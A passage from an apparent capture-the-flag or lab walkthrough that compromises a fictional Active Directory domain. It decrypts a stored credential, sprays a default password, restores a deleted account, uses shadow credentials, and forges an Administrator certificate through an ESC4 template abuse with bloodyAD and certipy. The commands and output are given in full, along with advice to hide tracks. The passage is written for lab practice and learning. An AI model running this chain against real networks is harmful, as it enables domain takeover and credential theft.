|   |       Open-SupportPortal.ps1
|   |       Reset-DomainDefaultPassword.ps1
|   |       Test-DomainConnectivity.ps1
|   |       Unlock-UserAccount.ps1
|   +---Software
|   |       Deploy-NTRights.ps1
|   |       Install-7Zip.ps1
|   |       Install-SQLExpress.ps1
|   |       Install-VLC.ps1
|   |       Test-DeploymentShare.ps1
|   \---Workstations
|           Clear-PrintQueue.ps1
|           Collect-SystemInfo.ps1
|           Enable-RDP.ps1
|           GPUpdate.ps1
|           Install-Printer.ps1
|           Install-RSAT.ps1
|           Join-Domain.ps1
|           Rename-Computer.ps1
|           Restart-RemotePC.ps1
+---Tools
|       Autologon.exe
|       putty.exe
|       WinSCP-6.5.6-Setup.exe
|       \---Sysinternals  (Autoruns, ProcessExplorer, PSTools — PsExec, PsLoggedon, psshutdown, ...)
\---Documentation
        Cybersecurity_Guidelines_2026.pdf
        New Employee Checklist.docx
```

The helpdesk toolbox (`C:\Support\Scripts\`) is full of AD one-liners — `Unlock-UserAccount.ps1`, `Reset-DomainDefaultPassword.ps1`, `domain_defaultPW.xml` (the [Section 16](#16-apherson--resurrecting-the-dead) lead) — and `C:\Support\Tools\Autologon.exe` ships in the Sysinternals bundle (the "To Check" note). The full Sysinternals/PSTools tree is collapsed to a single line; only the operationally relevant names are kept.

## 15.7 Looking Around — the Support Portal

```bash
➜ xfreerdp3 /u:'s.harrison' /v:10.0.10.25 /p:'SecretMyth123!' /dynamic-resolution +clipboard
```

The workstation's filesystem is the helpdesk toolbox we already mapped ([Section 14.6.1](#1461-linpeas)) — but the item that matters for what's next is on s.harrison's **desktop: the Support Portal shortcut**. The `HTTP/supportportal.westbridge.hsm` SPN we first found in WEB's keytab ([Section 14.6](#146-bonus-loot--keytabs-everywhere) finally gets a face — reached here over RDP as s.harrison, not via the `WEB$` keytab.

RDP session, portal sign-in as s.harrison:

![Support Portal — login](/assets/images/westbridge-supportportal-login.png)

![Support Portal — tickets](/assets/images/westbridge-supportportal-tickets.png)

The **Team Chat** is where it gets interesting:

![Support Portal — chat with the Research Operator](/assets/images/westbridge-supportportal-chat-clue.png)

Read this against everything we know:

* The **Research Operator** account chats *from the other side of the trust* — this is our `researchoperator` user from the very first LDAP dump, living in `WESTBRIDGE-RESEARCH.HSM`.
* They're trying to join a **cross-domain group** ("Research Web Operations"), and the failure is pure **AD group-scope mechanics**: a Global group can't contain members from another domain; Global ➜ Universal ➜ Domain Local is exactly the migration path for making a group accept cross-domain members.
* Harrison's answer isn't small talk — it's a **roadmap**. Somewhere in the directory there is a group whose scope is mid-conversion (or about to be), and once it lands at Domain Local, accounts from the research forest can walk into `westbridge.hsm` through it.

That's the endgame thread: the trust we flagged in [Section 8.1](#81-a-second-forest), the `researchoperator` oddball from [Section 4.2](#42-what-we-got), and this chat are all pointing at the same door. When we're ready to cross into the research forest, the entry ticket may literally be a group-scope change — and the lab's own helpdesk tickets hint at it too, with one thread referencing the very logon-hours restriction we just cleared, the stories quietly matching their mechanics.

**Flag 4 captured.** Three hosts fully owned, the fourth (DC) authenticated-into half a dozen ways — and every step of this stage was pure directory manipulation: no exploit, no brute force, just the domain's own permission model used exactly as designed, by someone it was never meant to let in.

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Administrator | Flag02 |
| WEB 10.0.10.10 | root | Flag03 |
| **HELPDESK-WS 10.0.10.25** | **local admin via s.harrison** | **Flag04** |
| DC 10.0.10.5 | authenticated, no shell yet | — |

---

# 16. a.pherson — Resurrecting the Dead

## 16.1 The Default-Password Trail

The helpdesk toolbox on HELPDESK-WS (`C:\Support\Scripts\`) held a gem: `domain_defaultPW.xml` — a PowerShell `PSCredential` object. `Import-Clixml` + a `GetNetworkCredential().Password` read later:

```bash
PS C:\Support\Scripts\ActiveDirectory> dir

    Directory: C:\Support\Scripts\ActiveDirectory

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/15/2026   2:21 PM            308 Collect-SystemInfo.ps1
-a----         7/15/2026   4:26 PM           1852 domain_defaultPW.xml
-a----         7/15/2026   2:21 PM            255 Get-ComputerInfo.ps1
-a----         7/15/2026   2:21 PM           1313 Get-DomainUserInfo.ps1
-a----         7/15/2026   2:20 PM            290 Get-GroupMembership.ps1
-a----         7/15/2026   2:20 PM            146 Get-InstalledPrinters.ps1
-a----         7/15/2026   2:20 PM            153 Open-SupportPortal.ps1
-a----         7/15/2026   2:19 PM           1187 Reset-DomainDefaultPassword.ps1
-a----         7/15/2026   2:19 PM            231 Test-DomainConnectivity.ps1
-a----         7/15/2026   2:19 PM            317 Unlock-UserAccount.ps1


PS C:\Support\Scripts\ActiveDirectory> cat domain_defaultPW.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">DefaultPassword</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000004a6e558d24b86e4d8ebf99584b7b3b6c00000000020000000000106600000001000020000000761ba7c084a30f81b16e6b4a03ab3787d2ed0de1f9abaab26a6261449b7aa49b000000000e80000000020000200000003241c8ecf8c79efdfd37f84009af80c67d68dfab4faf5edef68d41570681817a30000000eafef4f2d095ab18c559c7f9b04e2d0bef88fa6a03daa14956f2daf07575955ae675254eab726fc9be10c49ad8fad5ab40000000dc450aa4f887f925cc97cb7e20cfc4f71d1f0641ae7a749cc98fa9ae54d4e82f95a31c06cfafe2df2c176eca5644d26f77e2a0e4219763b20db2d519ac353c78</SS>
    </Props>
  </Obj>
</Objs>

PS C:\Support\Scripts\ActiveDirectory> $cred = Import-Clixml -Path "C:\Support\Scripts\ActiveDirectory\domain_defaultPW.xml"
PS C:\Support\Scripts\ActiveDirectory> $cred.GetNetworkCredential().Password
Welcome2Westbridge!
```

Sprayed across the estate — one hit, and it's a strange one:

```bash
➜ nxc smb dc.westbridge.hsm \
    -u 'users.txt' -p 'Welcome2Westbridge!' \
    --continue-on-success
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\Administrator:Welcome2Westbridge! STATUS_ACCOUNT_RESTRICTION
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\Guest:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\krbtgt:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\m.thompson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\r.anderson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.wilson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\d.parker:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\s.harrison:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_legacy:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_mssql:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\o.carter:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\n.brooks:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\e.foster:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\l.reed:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.ward:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\a.price:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\d.murphy:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\l.cole:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\o.griffin:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\h.powell:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\i.bishop:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.hayes:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\j.walsh:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\p.sullivan:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\t.russell:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.anderson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\b.wellington:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_files:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_web:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_krb_t2:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\a.pherson:Welcome2Westbridge! STATUS_PASSWORD_MUST_CHANGE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\d.hoff:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\b.jones:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\a.owen:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\researchoperator:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_webmonitor:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\j.bennett:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\s.adams:Welcome2Westbridge! STATUS_LOGON_FAILURE
```

```
[-] westbridge.hsm\a.pherson:Welcome2Westbridge! STATUS_PASSWORD_MUST_CHANGE
```

`a.pherson` — the account that's been sitting in our dump since the first LDAP pull with **`Last PW Set: <never>`** — knows the default password, but it's expired-on-first-login. The account has never once been used.

The bypass is protocol-level: **kpasswd (port 464)** — the Kerberos-native password-change protocol — ignores the SAMR "cannot change password" flag entirely:

```bash
➜ kpasswd a.pherson          # old: Welcome2Westbridge! ➜ new: SecretMyth123!
Password for a.pherson@WESTBRIDGE.HSM:
Enter new password:
Enter it again:
Password changed.
```

`kpasswd` talks Kerberos on port 464, which bypasses the SAMR/RPC flag that blocks `changepasswd.py` and `rpcclient`. Verify with an SMB login:

```bash
➜ nxc smb dc.westbridge.hsm \
    -u 'a.pherson' -p 'SecretMyth123!'
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\a.pherson:SecretMyth123!
```

## 16.2 What Is a.pherson? — The Lifecycle Account

![BloodHound — a.pherson memberships](/assets/images/westbridge-bh-apherson-membersof.png)

Member of **User Lifecycle Management** — the provisioning/cleanup role. And its outbound rights explain everything that follows:

![BloodHound — a.pherson outbound: GenericWrite over Deleted Objects + lifecycle targets](/assets/images/westbridge-bh-apherson-outbound.png)

`bloodyAD get writable` spells it out — including **write access to `CN=Deleted Objects`** itself, plus three *named* tombstones:

```bash
➜ getTGT.py westbridge.hsm/a.pherson:'SecretMyth123!'
[*] Saving ticket in a.pherson.ccache

➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.pherson \
    -k ccache=./a.pherson.ccache \
    get membership 'a.pherson'

distinguishedName: CN=Users,CN=Builtin,DC=westbridge,DC=hsm
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=westbridge,DC=hsm
objectSid: S-1-5-21-1978613116-3728955385-531918137-513
sAMAccountName: Domain Users

distinguishedName: CN=User Lifecycle Management,CN=Users,DC=westbridge,DC=hsm
objectSid: S-1-5-21-1978613116-3728955385-531918137-9513
sAMAccountName: UserLifecycleManagement
```

Then the writable surface — the three tombstones are spelled out by name below; the DNS zones, ForeignSecurityPrincipals, and bare `CN=Users` write are capability we don't need for this chain:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.pherson \
    -k ccache=./a.pherson.ccache \
    get writable

distinguishedName: CN=Users,DC=westbridge,DC=hsm
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Deleted Objects,DC=westbridge,DC=hsm
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=a.pherson,CN=Users,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=t.dixon\0ADEL:28a4ef10-bfa7-4c4a-a498-c803cca04cb7,CN=Deleted Objects,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=a.collins\0ADEL:3c321a1e-1ef3-4619-a10b-e25882fc48c7,CN=Deleted Objects,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: DC=westbridge.hsm,CN=MicrosoftDNS,DC=DomainDnsZones,DC=westbridge,DC=hsm
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.westbridge.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=westbridge,DC=hsm
permission: CREATE_CHILD

distinguishedName: DC=westbridge-research.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=westbridge,DC=hsm
permission: CREATE_CHILD
```

Deleted-but-not-gone: three users in AD's recycle bin, and we hold restore rights over the container and each of them.

## 16.3 Tombstone Resurrection

> We're officially entering the AD graveyard. Turns out, playing necromancer and restoring a deleted account is a lot easier than explaining to IT why you need `GenericAll` over Tier 3.

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.pherson \
    -k ccache=./a.pherson.ccache \
    set restore 'CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm'

[*] Restoring: CN=j.dillonADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm
[+] CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm has been restored successfully under CN=j.dillon,CN=Users,DC=westbridge,DC=hsm
```

No need to restore **t.dixon** and **a.collins** — dead j.dillon is walking again (password-less, but present). Fresh BloodHound collection to see what came back with them:

```bash
➜ env KRB5CCNAME=a.pherson.ccache \
rusthound-ce \
    -d westbridge.hsm -f dc.westbridge.hsm -k \
    --zip -c All
```

## 16.4 j.dillon ➜ IT TIER3 ➜ a.owen

The updated graph shows a.pherson's restored control — GenericWrite over the lifecycle targets including **j.dillon**:

![BloodHound — a.pherson GenericWrite post-restore (j.dillon visible)](/assets/images/westbridge-bh-apherson-generic-updated.png)

And j.dillon is the prize of the three: **GenericAll over the IT TIER3 OU** — the privileged tier we flagged back in [Section 8.4](#84-non-default-acl-edges) as controlled by a "hidden" account. The hidden account was an AD tombstone. We revived it into Tier 3:

![BloodHound — j.dillon GenericAll over IT TIER3](/assets/images/westbridge-bh-jdillion-genericall-tier3.png)

Three steps, each with its own purpose — first become j.dillon (the privilege we just restored), then write the OU right explicitly (so it doesn't depend on a.pherson's restored chain staying intact), then reset a Tier-3 member's password:

**Step 1 — become j.dillon via shadow credential** (certipy auto-handles the certificate write + KeyCredentialLink + PKINIT):

```bash
➜ env KRB5CCNAME=a.pherson.ccache \
certipy shadow auto \
    -u 'a.pherson' -k -no-pass \
    -account 'j.dillon' \
    -target dc.westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'j.dillon'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3ce8bcb086b948ef9795b9ebf5b73206'
[*] Adding Key Credential with device ID '3ce8bcb086b948ef9795b9ebf5b73206' to the Key Credentials for 'j.dillon'
[*] Successfully added Key Credential with device ID '3ce8bcb086b948ef9795b9ebf5b73206' to the Key Credentials for 'j.dillon'
[*] Authenticating as 'j.dillon' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'j.dillon@westbridge.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'j.dillon.ccache'
[*] Wrote credential cache to 'j.dillon.ccache'
[*] Trying to retrieve NT hash for 'j.dillon'
[*] Restoring the old Key Credentials for 'j.dillon'
[*] Successfully restored the old Key Credentials for 'j.dillon'
[*] NT hash for 'j.dillon': 8bd7ff5bf2b9c11fcd54377575887b1d
```

**Step 2 — formalise the GenericAll on the OU itself** (j.dillon's restored GenericAll over IT TIER3 is what the BloodHound graph shows; writing the explicit ACE onto the OU object makes the right self-contained — it survives even if a.pherson's restored control is torn down):

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u j.dillon \
    -k ccache=./j.dillon.ccache \
    add genericAll 'OU=IT Tier3,DC=westbridge,DC=hsm' j.dillon

[+] j.dillon has now GenericAll on OU=IT Tier3,DC=westbridge,DC=hsm
```

**Step 3 — reset a Tier-3 member's password** (a.owen of CA-MANAGER — the next stage's target):

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u j.dillon \
    -k ccache=./j.dillon.ccache \
    set password 'a.owen' 'SecretMyth123!'

[+] Password changed successfully!
```

## 16.5 Why a.owen Matters

![BloodHound — a.owen memberships incl. CA-MANAGER + cert template enrollment](/assets/images/westbridge-bh-aowen-outbound.png)

**a.owen is a member of CA-MANAGER** — administration over the `CA01-AD-CA` enterprise CA that's been in every TLS cert since [Section 1.2](#12-port-scans) — plus Enroll rights across the certificate templates. Tier 3 was the CA's front door all along.

The chain in one line: *default password ➜ kpasswd bypass ➜ lifecycle rights ➜ tombstone restore ➜ shadow credential ➜ Tier-3 password reset ➜ CA administration.* Every link was already in the directory; we just followed the resurrection trail.

---

# 17. PRIVESC DC01 — ESC4 on the CA

> Follow the white rabbit to DC. 🐇

The endgame starts with the CA. a.owen (CA-Manager) can't *enroll* on the juicy template — but the ESC4 path says he doesn't need to: he owns the template object itself.

## 17.1 Recon — Finding the Writable Template

Two questions to answer before touching anything: who can manage the CA itself, and what can a.owen actually write to at the template level?

**Step 1 — check the CA object's manage rights.** A quick `certipy find` surfaces the vulnerable templates:

```bash
➜ getTGT.py westbridge.hsm/a.owen:'SecretMyth123!'
[*] Saving ticket in a.owen.ccache

➜ env KRB5CCNAME=a.owen.ccache \
certipy find \
    -u 'a.owen' -k -no-pass \
    -target dc.westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5
```

Parse the resulting JSON to filter for vulnerabilities:

```zsh
➜ jq -r '.["Certificate Templates"] | to_entries[] | select(.value.["[!] Vulnerabilities"] != null and .value.["[!] Vulnerabilities"] != "") | "\(.key)\t\(.value.["Template Name"])\t\(.value.["[!] Vulnerabilities"])"' 20260822235201_Certipy.json

0       SmartCardAuthentication {"ESC4":"User has dangerous permissions."}
```

The `SmartCardAuthentication` template is flagged **ESC4**. `a.owen` holds dangerous permissions on the template object itself.

**Step 2 — verify write access.** The templates live in the CONFIGURATION partition. Let's confirm our control:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.owen \
    -k ccache=./a.owen.ccache \
    -s get writable --partition CONFIGURATION

distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
permission: WRITE
OWNER: WRITE
DACL: WRITE
```

We hold `WRITE`, `OWNER: WRITE`, and `DACL: WRITE`. A certificate from this template logs you into the domain as whoever it names, and we hold the keys to rewrite its definition.


## 17.2 Reading the Guard Rail

Before rewriting the DACL, read the template's current rules:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.owen \
    -k ccache=./a.owen.ccache \
    get object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    --attr msPKI-Certificate-Name-Flag

distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
msPKI-Certificate-Name-Flag: 0
```

The attribute comes back as `0` — the safe default. The CA will build the certificate's identity from the requester's AD account. If we ask for a cert now, we get a cert for `a.owen`.

We need to flip this to `1` (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`), which tells the CA to allow the requester to specify any Subject Alternative Name (SAN) they want.

> **The Theory:** For a deep-dive into the 13-bit supply-vs-require bitmask, OPSEC-safe OR-writes, and why we are manually flipping bits instead of using `certipy template -write-default-configuration`, read the dedicated breakdown: [Demystifying msPKI-Certificate-Name-Flag](/adcs/demystifying-mspki-certificate-name-flag/). For this lab, we just need the `1`.

## 17.3 Execution — Flip, Enroll, Authenticate

> ADCS is the gift that keeps on giving. When `msPKI-Certificate-Name-Flag` is involved, you aren't just requesting a certificate; you're requesting the kingdom.

The kill chain: flip the flag, grant ourselves Enroll rights, pull the domain SID, and request an Administrator certificate.

**Step 1 — flip the flag.** Write `1` to `msPKI-Certificate-Name-Flag`:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.owen \
    -k ccache=./a.owen.ccache \
    set object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    msPKI-Certificate-Name-Flag -v 1

[+] CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm's msPKI-Certificate-Name-Flag has been updated
```

**Step 2 — grant Enroll rights.** Add a `GenericAll` ACE to guarantee the CA allows us to request the certificate:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.owen \
    -k ccache=./a.owen.ccache \
    add genericAll 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' a.owen

[+] a.owen has now GenericAll
```

**Step 3 — pull the domain SID.** `certipy req` requires the RID-500 form (`<domain-sid>-500`) to bake into the cert's security extension:

```bash
➜ nxc ldap dc.westbridge.hsm \
    -u 'a.owen' -p 'SecretMyth123!' \
    --get-sid

...[snip]...
LDAP        10.0.10.5       389    DC               Domain SID S-1-5-21-1978613116-3728955385-531918137
```

**Step 4 — enroll as Administrator.** Request the cert with the forged SAN:

```bash
➜ env KRB5CCNAME=a.owen.ccache \
certipy req \
    -u 'a.owen' -k -no-pass \
    -target dc.westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5 \
    -ca CA01-AD-CA \
    -template SmartCardAuthentication \
    -upn administrator@westbridge.hsm \
    -sid 'S-1-5-21-1978613116-3728955385-531918137-500'

[*] Got certificate with UPN 'administrator@westbridge.hsm'
[*] Certificate object SID is 'S-1-5-21-1978613116-3728955385-531918137-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

**Step 5 — PKINIT and recover the NT hash.** Present the forged certificate to the KDC, get a TGT, and extract the NT hash:

```bash
➜ certipy auth \
    -pfx administrator.pfx -dc-ip 10.0.10.5

[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@westbridge.hsm': aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b
```

Domain Administrator compromised.

### Clean Up

Restore the template baseline to keep the lab clean and hide your tracks:

```zsh
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.owen \
    -k ccache=./a.owen.ccache \
    set object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    msPKI-Certificate-Name-Flag -v 0
```

## 17.4 Execution — Administrator's Hash, Domain Done

Point `evil_winrmexec` at the DC using the ccache, then prove who we are, list the desktop, and read the flag:

```bash
➜ env KRB5CCNAME=administrator.ccache \
evil_winrmexec -k dc.westbridge.hsm -dc-ip 10.0.10.5

PS C:\Users\Administrator\Documents> whoami; hostname
westbridge\administrator
DC

PS > dir ..\Desktop
Database.kdb                    🡐 KeePass vault (noted for later)
Forest_Trust_Validation.eml     🡐 trust-related mail (also for later)

PS > type ..\Desktop\flag.txt
Flag05[ADCS_XXX_XX_0wned]
```

`whoami` returns `westbridge\administrator` and `hostname` returns `DC` — Domain Admin on the domain controller, confirmed. The `dir` shows the two artefacts on the Administrator's desktop that matter for the next sections (the KeePass DB and the trust-validation email).

## 17.4.1 Housekeeping: The Protected Users Group

Check the privilege set with `whoami /groups`. We expect the standard triad (`Domain Admins`, `Enterprise Admins`, `Schema Admins`), but one specific membership dictates our next move:

```bash
PS C:\Users\Administrator\Desktop> whoami /groups

GROUP INFORMATION
------------------

Group Name                                        Type             SID                                          Attributes
================================================= ================ ============================================ ===============================================================
Everyone                                          Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                            Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                     Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access           Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access        Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                              Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                  Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                    Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Protected Users                        Group            S-1-5-21-1978613116-3728955385-531918137-525 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Group Policy Creator Owners            Group            S-1-5-21-1978613116-3728955385-531918137-520 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Domain Admins                          Group            S-1-5-21-1978613116-3728955385-531918137-512 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Enterprise Admins                      Group            S-1-5-21-1978613116-3728955385-531918137-519 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Schema Admins                          Group            S-1-5-21-1978613116-3728955385-531918137-518 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity        Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Denied RODC Password Replication Group Alias            S-1-5-21-1978613116-3728955385-531918137-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\This Organization Certificate        Well-known group S-1-5-65-1                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level              Label            S-1-16-12288
```

The Administrator account belongs to `Protected Users `(RID 525). Members of this group cannot use NTLM authentication, cannot be delegated to, and have their TGT lifetimes strictly capped. This breaks a massive amount of standard post-exploitation tooling.

Since we own the domain, we just kick ourselves out of the group to ensure our ccache stays globally useful:

```bash
PS C:\Users\Administrator\Desktop> net group "Protected Users" Administrator /delete
The command completed successfully.
```

**Flag 5 captured. All five hosts owned; the westbridge.hsm domain is done.**

| Host | Status | Flag |
|---|---|---|
| SQL (10.0.10.20) | SYSTEM | Flag01 |
| FILES (10.0.10.15) | local Administrator | Flag02 |
| WEB (10.0.10.10) | root | Flag03 |
| HELPDESK-WS (10.0.10.25) | local admin via s.harrison | Flag04 |
| **DC (10.0.10.5)** | **Domain Admin via ESC4** | **Flag05** |

The Administrator ccache isn't just a shell on this domain—it's a skeleton key for the next one.
Next section — pointing it across the research forest trust.

## 17.5 Post-Exploitation — Full NTDS Dump

Domain Admin on the DC means one thing before anything else — acquiring the entire domain's credential database.

Verify the cached ticket still opens doors, then run the dump:

```bash
➜ env KRB5CCNAME=administrator.ccache \
